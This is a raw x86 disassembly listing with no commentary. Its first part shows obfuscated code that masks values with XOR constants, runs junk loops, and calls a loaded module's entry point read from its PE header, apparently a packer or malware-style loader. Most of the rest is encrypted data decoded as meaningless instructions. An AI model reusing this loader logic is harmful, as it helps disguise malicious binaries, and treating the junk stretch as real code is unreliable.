  4096b3:	xor    eax,esi
  4096b5:	lea    eax,[ebp+eax*1+0x3272a3]
  4096bc:	push   eax
  4096bd:	mov    eax,ds:0x4121a8
  4096c2:	push   DWORD PTR [eax+0x1bc]
  4096c8:	call   0x4020d0
  4096cd:	mov    eax,DWORD PTR [ebp-0x4]
  4096d0:	xor    eax,esi
  4096d2:	lea    ebx,[ebx+eax*1+0x32729b]
  4096d9:	mov    eax,DWORD PTR [ebp-0x4]
  4096dc:	mov    ecx,DWORD PTR [ebp-0x4]
  4096df:	xor    ecx,esi
  4096e1:	xor    eax,esi
  4096e3:	add    eax,ecx
  4096e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4096e8:	xor    ecx,esi
  4096ea:	lea    eax,[eax+ecx*1+0x9757d1]
  4096f1:	cmp    ebx,eax
  4096f3:	jbe    0x4096a3
  4096f9:	mov    eax,0xf89c853d
  4096fe:	mov    ecx,DWORD PTR [ebp+0xc]
  409701:	mov    DWORD PTR ds:0x41202c,ecx
  409707:	mov    ecx,DWORD PTR [ebp+0x10]
  40970a:	mov    DWORD PTR ds:0x412280,ecx
  409710:	mov    ecx,DWORD PTR ds:0x41202c
  409716:	mov    edx,DWORD PTR [ebp-0x14]
  409719:	sub    ecx,edi
  40971b:	xor    ecx,esi
  40971d:	mov    DWORD PTR [edx],ecx
  40971f:	mov    ecx,DWORD PTR [ebp-0x18]
  409722:	cmp    ecx,0xf89c8532
  409728:	je     0x409785
  40972e:	mov    ecx,DWORD PTR [ebp-0x8]
  409731:	mov    edx,DWORD PTR [ebp-0x1c]
  409734:	xor    ecx,esi
  409736:	add    ecx,edi
  409738:	cmp    ecx,edx
  40973a:	je     0x409785
  409740:	mov    eax,ds:0x4121a8
  409745:	mov    eax,DWORD PTR [eax+0x194]
  40974b:	mov    ecx,DWORD PTR [eax]
  40974d:	mov    eax,DWORD PTR [ecx+0x3c]
  409750:	push   DWORD PTR ds:0x412280
  409756:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  40975a:	push   DWORD PTR ds:0x41202c
  409760:	add    eax,ecx
  409762:	mov    ecx,DWORD PTR ds:0x4121a8
  409768:	mov    ecx,DWORD PTR [ecx+0x194]
  40976e:	push   DWORD PTR [ecx]
  409770:	call   eax
  409772:	mov    ecx,DWORD PTR ds:0x4121a8
  409778:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40977e:	mov    DWORD PTR [ecx],eax
  409780:	jmp    0x409895
  409785:	mov    ecx,DWORD PTR [ebp-0x8]
  409788:	mov    edx,DWORD PTR [ebp-0x20]
  40978b:	xor    ecx,esi
  40978d:	add    ecx,edi
  40978f:	cmp    ecx,edx
  409791:	jne    0x409878
  409797:	mov    ecx,DWORD PTR [ebp-0x8]
  40979a:	xor    ecx,esi
  40979c:	add    ecx,edi
  40979e:	mov    DWORD PTR ds:0x41222c,ecx
  4097a4:	mov    ecx,DWORD PTR [ebp-0x8]
  4097a7:	xor    ecx,esi
  4097a9:	add    ecx,edi
  4097ab:	mov    DWORD PTR ds:0x412224,ecx
  4097b1:	mov    ecx,DWORD PTR [ebp-0x4]
  4097b4:	mov    DWORD PTR [ebp-0xc],ecx
  4097b7:	mov    ecx,DWORD PTR [ebp-0x8]
  4097ba:	mov    DWORD PTR [ebp+0xc],ecx
  4097bd:	mov    ecx,DWORD PTR [ebp+0xc]
  4097c0:	xor    ecx,esi
  4097c2:	add    ecx,edi
  4097c4:	mov    DWORD PTR [ebp+0xc],ecx
  4097c7:	mov    ecx,DWORD PTR ds:0x412028
  4097cd:	mov    ecx,DWORD PTR [ecx]
  4097cf:	mov    DWORD PTR [ebp+0xc],ecx
  4097d2:	mov    ecx,DWORD PTR ds:0x412230
  4097d8:	mov    ecx,DWORD PTR [ecx]
  4097da:	mov    DWORD PTR [ebp-0x14],ecx
  4097dd:	mov    DWORD PTR [ebp+0x10],0xf89c8731
  4097e4:	mov    ecx,DWORD PTR [ebp+0x10]
  4097e7:	xor    ecx,esi
  4097e9:	add    ecx,edi
  4097eb:	mov    DWORD PTR [ebp+0x10],ecx
  4097ee:	mov    ecx,DWORD PTR ds:0x4121a8
  4097f4:	mov    DWORD PTR [ebp+0x10],ecx
  4097f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4097fa:	mov    DWORD PTR [ebp+0xc],ecx
  4097fd:	mov    ecx,DWORD PTR [ebp+0xc]
  409800:	push   0x4
  409802:	pop    edx
  409803:	sub    edx,ecx
  409805:	add    edx,DWORD PTR [ebp-0x14]
  409808:	mov    DWORD PTR [ebp-0x24],0xf89c85f1
  40980f:	mov    DWORD PTR [ebp+0x10],edx
  409812:	mov    DWORD PTR [ebp-0x70],eax
  409815:	mov    eax,DWORD PTR [ebp+0xc]
  409818:	mov    DWORD PTR [ebp-0x6c],eax
  40981b:	mov    eax,DWORD PTR [ebp+0x10]
  40981e:	mov    DWORD PTR [ebp-0x68],eax
  409821:	mov    eax,DWORD PTR [ebp-0x24]
  409824:	xor    eax,esi
  409826:	add    eax,edi
  409828:	mov    DWORD PTR [ebp-0x64],eax
  40982b:	lea    eax,[ebp-0x2c]
  40982e:	mov    DWORD PTR [ebp-0x60],eax
  409831:	mov    eax,DWORD PTR [ebp-0x70]
  409834:	xor    eax,esi
  409836:	add    eax,edi
  409838:	mov    DWORD PTR [ebp-0x70],eax
  40983b:	lea    eax,[ebp-0x70]
  40983e:	push   eax
  40983f:	mov    eax,DWORD PTR [ebp-0xc]
  409842:	xor    eax,esi
  409844:	add    eax,edi
  409846:	push   eax
  409847:	mov    eax,ds:0x4121c8
  40984c:	push   0x41211e
  409851:	push   DWORD PTR [eax]
  409853:	call   0x40cdc5
  409858:	xor    esi,esi
  40985a:	mov    eax,DWORD PTR [ebp+0x10]
  40985d:	sub    eax,esi
  40985f:	push   eax
  409860:	mov    eax,DWORD PTR [ebp+0xc]
  409863:	add    eax,esi
  409865:	push   eax
  409866:	call   0x406a53
  40986b:	inc    esi
  40986c:	cmp    esi,0x52
  40986f:	jb     0x40985a
  409875:	mov    eax,DWORD PTR [ebp-0xc]
  409878:	call   0x4054ab
  40987d:	lea    eax,[ebp+0x4]
  409880:	mov    DWORD PTR [ebp-0x28],eax
  409883:	mov    eax,DWORD PTR [ebp-0x10]
  409886:	mov    eax,DWORD PTR [ebp-0x4]
  409889:	push   DWORD PTR [ebp-0x8]
  40988c:	lea    eax,[ebp-0x28]
  40988f:	push   eax
  409890:	call   0x40ccd9
  409895:	mov    eax,ds:0x4121a8
  40989a:	push   0x4
  40989c:	add    eax,0x1cc
  4098a1:	push   eax
  4098a2:	lea    eax,[ebp-0x10]
  4098a5:	push   eax
  4098a6:	call   0x4020d0
  4098ab:	mov    eax,DWORD PTR [ebp-0x10]
  4098ae:	mov    eax,DWORD PTR [eax]
  4098b0:	pop    edi
  4098b1:	pop    esi
  4098b2:	pop    ebx
  4098b3:	leave  
  4098b4:	ret    0xc
  4098b7:	push   ebp
  4098b8:	mov    ebp,esp
  4098ba:	sub    esp,0x24
  4098bd:	mov    eax,ds:0x4121a8
  4098c2:	xor    ecx,DWORD PTR ds:0x42e7c4
  4098c8:	mov    eax,DWORD PTR [eax+0x198]
  4098ce:	mov    DWORD PTR [ebp-0x8],eax
  4098d1:	mov    DWORD PTR ds:0x43045d,0x14
  4098db:	cmp    DWORD PTR ds:0x43045d,0x0
  4098e2:	je     0x40993f
  4098e8:	cmp    DWORD PTR ds:0x43045d,0x1b
  4098ef:	jne    0x40991f
  4098f5:	push   0x8cdb
  4098fa:	push   DWORD PTR [ebp-0x10]
  4098fd:	push   0x3afe
  409902:	push   0x5d4e
  409907:	push   DWORD PTR [ebp-0x10]
  40990a:	push   0x4817
  40990f:	push   0x7044
  409914:	push   0x34c1
  409919:	call   DWORD PTR ds:0x42ec33
  40991f:	mov    eax,ds:0x43045d
  409924:	dec    eax
  409925:	mov    ds:0x43045d,eax
  40992a:	jmp    0x4098db
  40992f:	mov    eax,ds:0x4304d7
  409934:	or     eax,DWORD PTR ds:0x4304df
  40993a:	mov    ds:0x4304d7,eax
  40993f:	mov    eax,DWORD PTR [ebp+0x8]
  409942:	mov    DWORD PTR ds:0x42e7d0,0x13
  40994c:	cmp    DWORD PTR ds:0x42e7d0,0x0
  409953:	je     0x40998b
  409959:	cmp    DWORD PTR ds:0x42e7d0,0x19
  409960:	jne    0x409979
  409966:	push   0x7ebc
  40996b:	push   0x1c7b
  409970:	push   DWORD PTR [ebp-0x10]
  409973:	call   DWORD PTR ds:0x42ec37
  409979:	mov    ecx,DWORD PTR ds:0x42e7d0
  40997f:	dec    ecx
  409980:	mov    DWORD PTR ds:0x42e7d0,ecx
  409986:	jmp    0x40994c
  40998b:	mov    ecx,DWORD PTR [ebp-0x8]
  40998e:	xor    DWORD PTR ds:0x430449,0x600e
  409998:	push   ebx
  409999:	push   esi
  40999a:	mov    esi,0x7510854
  40999f:	xor    eax,esi
  4099a1:	xor    DWORD PTR ds:0x430459,ebx
  4099a7:	push   edi
  4099a8:	and    DWORD PTR ds:0x4304cf,0x0
  4099b2:	mov    edi,DWORD PTR ds:0x4304cf
  4099b8:	inc    edi
  4099b9:	mov    DWORD PTR ds:0x4304cf,edi
  4099bf:	cmp    DWORD PTR ds:0x4304cf,0x8
  4099c6:	jne    0x4099e8
  4099cc:	push   0x43043d
  4099d1:	push   DWORD PTR [ebp-0x24]
  4099d4:	push   DWORD PTR [ebp-0x1c]
  4099d7:	push   DWORD PTR [ebp-0x28]
  4099da:	push   DWORD PTR [ebp-0x28]
  4099dd:	push   0x8706
  4099e2:	call   DWORD PTR ds:0x42eac7
  4099e8:	cmp    DWORD PTR ds:0x4304cf,0x7
  4099ef:	jne    0x409a02
  4099f5:	mov    edi,DWORD PTR ds:0x4304cf
  4099fb:	inc    edi
  4099fc:	mov    DWORD PTR ds:0x4304cf,edi
  409a02:	cmp    DWORD PTR ds:0x4304cf,0x16
  409a09:	jb     0x4099b2
  409a0f:	add    DWORD PTR ds:0x4304df,0x13b8
  409a19:	mov    edi,0x32729b
  409a1e:	and    DWORD PTR ds:0x430435,0x0
  409a28:	mov    ebx,DWORD PTR ds:0x430435
  409a2e:	inc    ebx
  409a2f:	mov    DWORD PTR ds:0x430435,ebx
  409a35:	cmp    DWORD PTR ds:0x430435,0xe
  409a3c:	jne    0x409a50
  409a42:	push   DWORD PTR [ebp-0x18]
  409a45:	push   0x6c31
  409a4a:	call   DWORD PTR ds:0x42ea03
  409a50:	cmp    DWORD PTR ds:0x430435,0xd
  409a57:	jne    0x409a6a
  409a5d:	mov    ebx,DWORD PTR ds:0x430435
  409a63:	inc    ebx
  409a64:	mov    DWORD PTR ds:0x430435,ebx
  409a6a:	cmp    DWORD PTR ds:0x430435,0x18
  409a71:	jb     0x409a28
  409a77:	mov    ebx,DWORD PTR ds:0x42e7c8
  409a7d:	or     DWORD PTR ds:0x42edcb,ebx
  409a83:	jmp    0x409dd0
  409a88:	pop    eax
  409a89:	push   edi
  409a8a:	lods   al,BYTE PTR ds:[esi]
  409a8b:	sahf   
  409a8c:	mov    cl,0x65
  409a8e:	push   0x8aa37451
  409a93:	push   ebx
  409a94:	scas   al,BYTE PTR es:[edi]
  409a95:	add    DWORD PTR [ecx+0x31],esp
  409a98:	pop    ecx
  409a99:	fdivr  QWORD PTR [esi+0x7e]
  409a9c:	cs jge 0x409b1d
  409a9f:	jle    0x409a58
  409aa1:	lods   al,BYTE PTR ds:[esi]
  409aa2:	daa    
  409aa3:	popa   
  409aa4:	rcr    DWORD PTR [ebx-0x4f09a7ff],1
  409aaa:	sbb    edx,DWORD PTR [ebp+0x523f5824]
  409ab0:	je     0x409a5c
  409ab2:	stc    
  409ab3:	ja     0x409ab4
  409ab5:	stos   BYTE PTR es:[edi],al
  409ab6:	cwde   
  409ab7:	repnz xchg ecx,eax
  409ab9:	mov    al,ds:0xb8cf17b9
  409abe:	je     0x409aad
  409ac0:	adc    bh,BYTE PTR [eax]
  409ac2:	pop    edi
  409ac3:	push   esp
  409ac4:	push   esi
  409ac5:	ds and eax,0x4b04f816
  409acb:	cld    
  409acc:	sbb    al,0x79
  409ace:	mov    edx,0x76b91135
  409ad3:	stc    
  409ad4:	sahf   
  409ad5:	in     eax,0x49
  409ad7:	lahf   
  409ad8:	outs   dx,BYTE PTR ds:[esi]
  409ad9:	push   esp
  409ada:	aad    0x1e
  409adc:	je     0x7364021a
  409ae2:	jmp    0x45ad3560
  409ae7:	cmovne edi,DWORD PTR [ecx+0x211b87f4]
  409aee:	shr    BYTE PTR [edi-0x37ff0149],cl
  409af4:	sbb    DWORD PTR [eax],0xffffffeb
  409af7:	(bad)  [ecx]
  409af9:	adc    ecx,DWORD PTR [edx]
  409afb:	leave  
  409afc:	mov    edi,0xec51f762
  409b01:	popa   
  409b02:	pop    ecx
  409b03:	jb     0x409ade
  409b05:	retf   0x8742
  409b08:	xor    DWORD PTR [ebx],ebx
  409b0a:	jmp    0x94b:0xdb2b0d98
  409b11:	mov    bl,0xf6
  409b13:	sub    eax,0x1e288f9b
  409b18:	enter  0xe251,0x2b
  409b1c:	push   0x2d36148
  409b21:	aaa    
  409b22:	inc    edx
  409b23:	ror    BYTE PTR [ebx+0x64],1
  409b26:	outs   dx,BYTE PTR ds:[esi]
  409b27:	mov    dh,0xaf
  409b29:	mov    esi,0xf8cfd6de
  409b2e:	popa   
  409b2f:	lods   al,BYTE PTR fs:[esi]
  409b31:	and    DWORD PTR [edi-0x6d4afc60],ebp
  409b37:	adc    DWORD PTR [eax+0x54],edi
  409b3a:	mov    edx,0x9bd76859
  409b3f:	addr16 mov dh,0xe0
  409b42:	mov    ah,0xc3
  409b44:	aas    
  409b45:	mov    al,ds:0x49deb6d4
  409b4a:	call   0xc06dba75
  409b4f:	pop    eax
  409b50:	xchg   edx,eax
  409b51:	out    dx,al
  409b52:	neg    DWORD PTR [ecx]
  409b54:	push   ebp
  409b55:	jno    0x409b91
  409b57:	in     eax,dx
  409b58:	lock jmp 0x500c:0xe0691165
  409b60:	ret    0xf82
  409b63:	es cld 
  409b65:	xor    eax,ebx
  409b67:	loopne 0x409b2d
  409b69:	leave  
  409b6a:	or     dl,ah
  409b6c:	mov    edi,0xa5931bf3
  409b71:	cmp    DWORD PTR [edx+ebp*8-0x5cffc529],ebx
  409b78:	xchg   ebx,eax
  409b79:	sbb    dh,BYTE PTR [ecx-0x5b6895e2]
  409b7f:	dec    ebp
  409b80:	dec    esi
  409b81:	push   0x77f2731a
  409b86:	out    0x1a,al
  409b88:	out    dx,eax
  409b89:	xor    al,BYTE PTR [ebp+ebp*4-0x6665e2d3]
  409b90:	jp     0x409bb5
  409b92:	mov    bh,0x1
  409b94:	test   al,0xca
  409b96:	cwde   
  409b97:	sti    
  409b98:	and    eax,0xdf41e9af
  409b9d:	or     eax,0xec318649
  409ba2:	test   DWORD PTR [ebx-0x26],edi
  409ba5:	jle    0x409bd2
  409ba7:	div    ebx
  409ba9:	sbb    eax,0x247f1e8a
  409bae:	imul   eax,esi,0xb60b01bd
  409bb4:	dec    edx
  409bb5:	inc    edx
  409bb6:	aaa    
  409bb7:	adc    DWORD PTR [ebx-0x7a],edi
  409bba:	sub    BYTE PTR fs:[ecx+0x57390520],bl
  409bc1:	fidiv  WORD PTR [edx-0x6e]
  409bc4:	jecxz  0x409c2b
  409bc6:	outs   dx,DWORD PTR ds:[esi]
  409bc7:	sbb    ebp,eax
  409bc9:	mov    cl,BYTE PTR [ecx+edx*2-0x5f]
  409bcd:	mov    ah,0xeb
  409bcf:	push   esi
  409bd0:	rcr    edx,0xf8
  409bd3:	fdivr  DWORD PTR [ecx]
  409bd5:	dec    esi
  409bd6:	adc    DWORD PTR [esi],ebx
  409bd8:	xchg   edx,eax
  409bd9:	ja     0x409c43
  409bdb:	mov    dl,0xae
  409bdd:	rcr    DWORD PTR [ecx],0x7a
  409be0:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409be2:	int3   
  409be3:	dec    esp
  409be4:	mov    cl,0x44
  409be6:	mov    edx,0xaf7bccaa
  409beb:	ja     0x409bc1
  409bed:	sub    ch,BYTE PTR [esi-0x11]
  409bf0:	or     al,0x1
  409bf2:	dec    DWORD PTR [eax-0x58]
  409bf5:	or     eax,0x3b2bdedc
  409bfa:	inc    edi
  409bfb:	lock sbb ah,bl
  409bfe:	dec    edi
  409bff:	pop    edx
  409c00:	fwait
  409c01:	sub    bh,dl
  409c03:	out    dx,al
  409c04:	sub    ah,BYTE PTR [esp+esi*4+0x7b]
  409c08:	mov    edx,0xc34dca51
  409c0d:	ds mov ch,0xe6
  409c10:	mov    ah,0xde
  409c12:	dec    esp
  409c13:	xchg   ebp,eax
  409c14:	aaa    
  409c15:	outs   dx,BYTE PTR ds:[esi]
  409c16:	mov    ah,0xe8
  409c18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c19:	cli    
  409c1a:	out    0x56,eax
  409c1c:	loopne 0x409c09
  409c1e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c1f:	(bad)  
  409c20:	in     al,dx
  409c21:	sbb    al,0x7a
  409c23:	xlat   BYTE PTR ds:[ebx]
  409c24:	(bad)  
  409c25:	xor    bl,BYTE PTR [ecx-0x1591a4af]
  409c2b:	add    al,0x4b
  409c2d:	mov    dl,BYTE PTR [esi+0x39]
  409c30:	out    dx,al
  409c31:	mov    bh,0x2c
  409c33:	call   0xbecf:0x684e4bd2
  409c3a:	pop    es
  409c3b:	lods   al,BYTE PTR ds:[esi]
  409c3c:	sar    bl,cl
  409c3e:	loopne 0x409c5c
  409c40:	push   eax
  409c41:	scas   eax,DWORD PTR es:[edi]
  409c42:	jae    0x409c9c
  409c44:	stc    
  409c45:	loope  0x409c4c
  409c47:	cli    
  409c48:	ds push edi
  409c4a:	mov    dl,0xa1
  409c4c:	push   eax
  409c4d:	cmp    BYTE PTR [ebx],cl
  409c4f:	cmp    edx,DWORD PTR [ebx+ecx*1+0x33]
  409c53:	jle    0x409c79
  409c55:	push   edx
  409c56:	shl    BYTE PTR ds:0x29e15376,0x30
  409c5d:	push   cs
  409c5e:	in     al,0xd3
  409c60:	adc    esi,DWORD PTR [eax]
  409c62:	(bad)  
  409c63:	dec    BYTE PTR [edx+0x9c58070]
  409c69:	mov    dl,0xb2
  409c6b:	jmp    0x27f02ce
  409c70:	rcr    DWORD PTR [eax-0xa365c7c],1
  409c76:	inc    esi
  409c77:	jl     0x409c0b
  409c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7a:	in     al,0xf5
  409c7c:	xchg   esp,eax
  409c7d:	jne    0x409cf0
  409c7f:	ins    DWORD PTR es:[edi],dx
  409c80:	pop    ebp
  409c81:	cli    
  409c82:	out    dx,eax
  409c83:	jns    0x409c6b
  409c85:	cli    
  409c86:	into   
  409c87:	nop
  409c88:	jno    0x409c63
  409c8a:	lods   eax,DWORD PTR ds:[esi]
  409c8b:	lahf   
  409c8c:	ins    DWORD PTR es:[edi],dx
  409c8d:	xchg   edx,eax
  409c8e:	inc    eax
  409c8f:	fadd   st(5),st
  409c91:	sbb    ecx,0x30
  409c94:	jne    0x409c93
  409c96:	mov    al,BYTE PTR [eax]
  409c98:	es jbe 0x409cca
  409c9b:	out    0x1f,eax
  409c9d:	imul   esi,DWORD PTR [ecx-0x37],0x45
  409ca1:	scas   al,BYTE PTR es:[edi]
  409ca2:	out    dx,eax
  409ca3:	adc    BYTE PTR [ebp-0x23],bl
  409ca6:	mov    ebp,esp
  409ca8:	(bad)  
  409ca9:	jmp    0x409cd4
  409cab:	and    BYTE PTR [edi+0x7e],0xee
  409caf:	add    DWORD PTR [edx+0x7f299ad8],ecx
  409cb5:	or     BYTE PTR [ebx+0x4d],bh
  409cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cb9:	or     ebp,ecx
  409cbb:	les    ecx,FWORD PTR [esi+0x461baf04]
  409cc1:	dec    ebx
  409cc2:	call   DWORD PTR ds:0x438dd349
  409cc8:	ss jne 0x409cb1
  409ccb:	push   ds
  409ccc:	mov    ch,0x77
  409cce:	and    al,0x2d
  409cd0:	aam    0x9
  409cd2:	and    ecx,DWORD PTR [ebx-0x1102f541]
  409cd8:	pop    esi
  409cd9:	sbb    esi,DWORD PTR [ecx+esi*2]
  409cdc:	jno    0x409d2f
  409cde:	dec    eax
  409cdf:	mov    ch,0xe
  409ce1:	jmp    0x1688:0x27cbbd56
  409ce8:	mov    DWORD PTR [ecx+0x330b1fa8],edx
  409cee:	cmp    al,0x2a
  409cf0:	pop    edi
  409cf1:	enter  0x99e6,0xa7
  409cf5:	arpl   WORD PTR [edx],di
  409cf7:	fmul   QWORD PTR [edx+0x25]
  409cfa:	mov    ah,0x4e
  409cfc:	mov    ch,0x36
  409cfe:	pushf  
  409cff:	ret    0xfea6
  409d02:	push   edi
  409d03:	retf   
  409d04:	(bad)  
  409d05:	jp     0x409c8f
  409d07:	pushf  
  409d08:	into   
  409d09:	adc    bh,dl
  409d0b:	ins    BYTE PTR es:[edi],dx
  409d0c:	xchg   DWORD PTR [ecx-0x77],eax
  409d0f:	fnsave [edi-0x32]
  409d12:	into   
  409d13:	mov    dh,0x77
  409d15:	jp     0x409ccd
  409d17:	pop    ebx
  409d18:	mov    ebx,0x46d025c4
  409d1d:	ret    0xf91a
  409d20:	add    BYTE PTR [edx],dh
  409d22:	inc    esi
  409d23:	aam    0x7d
  409d25:	popf   
  409d26:	xchg   ebx,eax
  409d27:	hlt    
  409d28:	push   ebp
  409d29:	mov    bl,0x51
  409d2b:	dec    esp
  409d2c:	push   eax
  409d2d:	fsub   st,st(2)
  409d2f:	div    BYTE PTR [esi+ebx*2]
  409d32:	sub    dl,BYTE PTR [esi+0x3fc9f4ac]
  409d38:	sub    bl,BYTE PTR [eax+eax*1+0x48]
  409d3c:	inc    eax
  409d3d:	push   edx
  409d3e:	mov    ecx,0x8f57208f
  409d43:	cld    
  409d44:	or     al,0xd1
  409d46:	fwait
  409d47:	sbb    eax,0x4e346bca
  409d4c:	pop    ebx
  409d4d:	ja     0x409d02
  409d4f:	fwait
  409d50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d51:	inc    edx
  409d52:	add    al,0xff
  409d54:	sub    BYTE PTR [ebx],bl
  409d56:	mov    ds:0x608f86a6,al
  409d5b:	add    ebx,esi
  409d5d:	sub    DWORD PTR [esi+ecx*4+0x20],0xffffffa7
  409d62:	daa    
  409d63:	mov    esp,DWORD PTR [ecx+ebx*1-0x3040b5e1]
  409d6a:	mov    edi,esi
  409d6c:	loopne 0x409de8
  409d6e:	fild   DWORD PTR [ebp+0x5b]
  409d71:	call   0x1543:0x58f99a22
  409d78:	mov    al,ds:0x4ad5a13d
  409d7d:	test   al,0xbe
  409d7f:	scas   eax,DWORD PTR es:[edi]
  409d80:	sub    DWORD PTR [eax],edi
  409d82:	dec    eax
  409d83:	push   esi
  409d84:	jge    0x409d35
  409d86:	std    
  409d87:	(bad)  
  409d88:	push   esi
  409d89:	test   BYTE PTR [ebx+0x2d3355bf],ah
  409d8f:	sti    
  409d90:	add    al,0x52
  409d92:	jae    0x409d93
  409d94:	mov    ds,WORD PTR [esi+0x7f]
  409d97:	push   esp
  409d98:	xlat   BYTE PTR ds:[ebx]
  409d99:	cmp    ch,BYTE PTR [ebx]
  409d9b:	mov    ah,0x8d
  409d9d:	push   ecx
  409d9e:	mov    eax,ds:0xea57cfec
  409da3:	psllq  mm4,QWORD PTR [ebx+0x1c749306]
  409daa:	mov    DWORD PTR [ebx],0x12e204f3
  409db0:	lock pop ebp
  409db2:	cwde   
  409db3:	mov    ebp,edx
  409db5:	cmc    
  409db6:	mov    bh,0x93
  409db8:	mov    ebp,0xceccd7ed
  409dbd:	inc    ebp
  409dbe:	sahf   
  409dbf:	adc    eax,0xcb8833a6
  409dc4:	pop    eax
  409dc5:	cmp    edi,ebp
  409dc7:	cdq    
  409dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dc9:	imul   eax,DWORD PTR [ebp-0x5dd70c45],0x8bc70337
  409dd3:	sbb    eax,0x42e7d8
  409dd8:	add    ebx,DWORD PTR ds:0x4304d7
  409dde:	mov    DWORD PTR ds:0x42e7d8,ebx
  409de4:	mov    DWORD PTR [ecx],eax
  409de6:	add    DWORD PTR ds:0x43045d,0xe83
  409df0:	lea    eax,[ebp-0x4]
  409df3:	sub    DWORD PTR ds:0x4304cf,ecx
  409df9:	mov    DWORD PTR [ebp-0x10],eax
  409dfc:	movzx  ebx,WORD PTR ds:0x430451
  409e03:	and    DWORD PTR ds:0x430471,ebx
  409e09:	mov    eax,DWORD PTR [ebp+0x8]
  409e0c:	add    DWORD PTR ds:0x43044d,0x3f18
  409e16:	mov    ecx,DWORD PTR [ebp-0x10]
  409e19:	jmp    0x40a166
  409e1e:	scas   al,BYTE PTR es:[edi]
  409e1f:	mov    ebx,0x35712771
  409e24:	push   0x30b4a53
  409e29:	jb     0x409e03
  409e2b:	cmc    
  409e2c:	fbstp  TBYTE PTR [ebp+0x9]
  409e2f:	fdivr  DWORD PTR [esi+0x7e]
  409e32:	cs jge 0x409eb3
  409e35:	jle    0x409e93
  409e37:	sbb    eax,0x5342afdc
  409e3c:	mov    dl,0xbd
  409e3e:	xchg   edi,eax
  409e3f:	mov    dl,al
  409e41:	jae    0x409e0c
  409e43:	push   ecx
  409e44:	lea    esi,[edi+0x153e82db]
  409e4a:	xor    cl,BYTE PTR [eax+0x622bf4bd]
  409e50:	sbb    al,0xf9
  409e52:	in     eax,0x2e
  409e54:	inc    esi
  409e55:	pop    ds
  409e56:	xchg   dh,ah
  409e58:	repnz push ss
  409e5a:	cmp    BYTE PTR [edx-0x35f51ea],0xa2
  409e61:	popf   
  409e62:	pop    edx
  409e63:	(bad)  
  409e64:	rol    DWORD PTR [esi-0x40d5a6f7],0xd8
  409e6b:	xchg   edi,eax
  409e6c:	(bad)  
  409e6d:	adc    ebp,DWORD PTR fs:[ecx+eax*4+0x75]
  409e72:	in     eax,0x3c
  409e74:	(bad)  
  409e75:	adc    al,0x1c
  409e77:	stos   DWORD PTR es:[edi],eax
  409e78:	clc    
  409e79:	setl   BYTE PTR [edx-0x59]
  409e7d:	add    bl,al
  409e7f:	retf   
  409e80:	in     eax,0x80
  409e82:	xlat   BYTE PTR ds:[ebx]
  409e83:	sub    eax,0x5dc852c
  409e88:	shl    BYTE PTR [ebx-0x39cb69a6],cl
  409e8e:	jnp    0x409e4d
  409e90:	jp     0x409e94
  409e92:	or     al,0x17
  409e94:	xchg   ecx,eax
  409e95:	cld    
  409e96:	pop    eax
  409e97:	jbe    0x409e5e
  409e99:	rcl    BYTE PTR [ecx+0xfa2f7d3],1
  409e9f:	add    BYTE PTR [ecx+eax*8+0x50553890],cl
  409ea6:	les    edx,FWORD PTR [ebp+edx*8-0x1c63f2ec]
  409ead:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409eae:	mov    es,WORD PTR [edi-0x4640877f]
  409eb4:	mov    BYTE PTR [ecx+0x29b315c4],bh
  409eba:	scas   eax,DWORD PTR es:[edi]
  409ebb:	jp     0x409ee2
  409ebd:	stos   BYTE PTR es:[edi],al
  409ebe:	lahf   
  409ebf:	int    0xaf
  409ec1:	fwait
  409ec2:	sbb    al,0xb7
  409ec4:	xchg   ecx,eax
  409ec5:	out    dx,al
  409ec6:	out    dx,al
  409ec7:	aaa    
  409ec8:	add    al,0xf
  409eca:	xor    bh,BYTE PTR [edi+0x53cb33a9]
  409ed0:	adc    esp,DWORD PTR [ecx]
  409ed2:	aaa    
  409ed3:	retf   
  409ed4:	dec    esi
  409ed5:	fs xchg esi,eax
  409ed7:	adc    ch,dl
  409ed9:	fst    DWORD PTR [edi]
  409edb:	mov    ah,0x7a
  409edd:	fild   QWORD PTR [ecx]
  409edf:	test   esi,0xba4add6d
  409ee5:	mov    bl,0xf8
  409ee7:	pop    ds
  409ee8:	xlat   BYTE PTR ds:[ebx]
  409ee9:	js     0x409f4e
  409eeb:	cmp    ecx,eax
  409eed:	jb     0x409f33
  409eef:	xchg   ecx,eax
  409ef0:	xchg   ebp,eax
  409ef1:	les    esp,FWORD PTR [ebp+0x5bd7e6fd]
  409ef7:	jmp    0x2734fc27
  409efc:	dec    eax
  409efd:	neg    DWORD PTR [eax]
  409eff:	cmc    
  409f00:	cld    
  409f01:	sbb    al,0x7d
  409f03:	fs ins DWORD PTR es:[edi],dx
  409f05:	std    
  409f06:	jmp    0xfdde:0x4393524f
  409f0d:	dec    eax
  409f0f:	pop    edi
  409f10:	adc    eax,DWORD PTR [edx]
  409f12:	mov    ds:0x488d662d,eax
  409f17:	inc    esp
  409f18:	data16 jne 0x409ed2
  409f1b:	je     0x409ed8
  409f1d:	jp     0x409ebf
  409f1f:	mov    ebp,DWORD PTR [ebp-0x67]
  409f22:	out    dx,al
  409f23:	mov    ebx,0x7a670fe5
  409f28:	inc    ebp
  409f29:	sbb    edi,eax
  409f2b:	dec    ebp
  409f2c:	adc    eax,0x8759c363
  409f31:	cs sub al,0xf4
  409f34:	push   edi
  409f35:	sub    bh,BYTE PTR [esi+0x59]
  409f38:	das    
  409f39:	inc    edx
  409f3a:	inc    esp
  409f3b:	mov    edx,0xe5e10d35
  409f40:	cmp    ah,BYTE PTR [edi-0x59]
  409f43:	push   0x58a70b0f
  409f48:	mov    dl,0xa5
  409f4a:	js     0x409f9c
  409f4c:	xlat   BYTE PTR ds:[ebx]
  409f4d:	xor    ah,dh
  409f4f:	icebp  
  409f50:	fsub   QWORD PTR [edi+0x468267df]
  409f56:	jl     0x409fcc
  409f58:	and    dh,BYTE PTR [ecx-0x6bb8d2ea]
